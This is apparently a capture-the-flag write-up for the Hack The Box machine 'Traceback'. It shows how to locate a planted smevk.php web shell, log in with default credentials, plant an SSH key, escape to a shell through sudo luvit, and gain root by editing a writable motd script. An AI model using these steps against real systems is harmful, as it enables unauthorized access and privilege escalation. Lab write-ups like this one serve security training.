# Traceback
## [nmap -A -T3 -p- -o traceback.nmap traceback.htb][1]

## This site has been owned

Once you land on the index page you find a nice alert that the site has been owned by ***Xh4H***

Let's start enumarating some dir on the webserver:
`gobuster dir -u http://traceback.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o directories.txt`
here you can find [directories.txt][2]. Nothing usefull on the webserver.

Looking at the source of webpage there's a comment by the hacker : `Some of the best web shells that you might need ;)` 

Searching with Google we can find [Web-Shells][3], there are many shells so let's create a dictionary with the shell's name and search wich one is using Xh4H

`gobuster dir -u http://traceback.htb -w shells.txt`
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://traceback.htb
[+] Threads:        10
[+] Wordlist:       shells.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/13 13:09:43 Starting gobuster
===============================================================
/smevk.php (Status: 200)
===============================================================
2020/06/13 13:09:44 Finished
===============================================================
```

***smevk.php*** is the backdoor.

## smevk.php 

The login credentials looking at the source code in the repository are: ***admin:admin***

using the webshell we can go inside the webadmin home, where there's a file from sysadmin note.txt:
```
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

add our ssh-key to the autorized_keys inside the webadmin home so we can login via ssh

running `sudo -l`
```
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

we can run as sysadmin [luvit][4] that seems to be a lua engine like node.  

Run it with `sudo -u sysadmin /home/sysadmin/luvit` that open an interactive prompt.

## sysadmin bash

Inside luvit run `os.execute("/bin/bash")` and we drop in sysadmin bash

### Writable files

```
find / -type f -writable 2>/dev/null | grep -v /proc
/etc/update-motd.d/50-motd-news
/etc/update-motd.d/10-help-text
/etc/update-motd.d/91-release-upgrade
/etc/update-motd.d/00-header
/etc/update-motd.d/80-esm
/home/sysadmin/.bashrc
/home/sysadmin/luvit
/home/sysadmin/.bash_logout
/home/sysadmin/.ssh/authorized_keys
/home/sysadmin/.cache/motd.legal-displayed
/home/sysadmin/.bash_history
/home/sysadmin/.profile
/home/webadmin/note.txt
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.access
/sys/fs/cgroup/memory/cgroup.event_control
```

### Readable files

`find / -type f -readable 2>/dev/null | grep -v /proc | grep -v /usr | grep -v /sys | grep -v /lib | grep -v /run | grep -v /sbin | grep -v /bin | grep -v /boot`
it's a really long list you can find it [here][4]

### SUID bins

```
find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/vmware-user-suid-wrapper
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/bin/ping
/bin/mount
/bin/fusermount
/bin/umount
/bin/su
```

Seems we can write into ***/etc/update-motd.d/00-header*** that is a script runned by root when you login via ssh. we can steal the root flag adding into it `cat /root/root.txt` 


[#]://
[1]: traceback.nmap
[2]: directories.txt
[3]: https://github.com/TheBinitGhimire/Web-Shells
[4]: readable.txt

![htbbadge](https://www.hackthebox.eu/badge/image/272787)
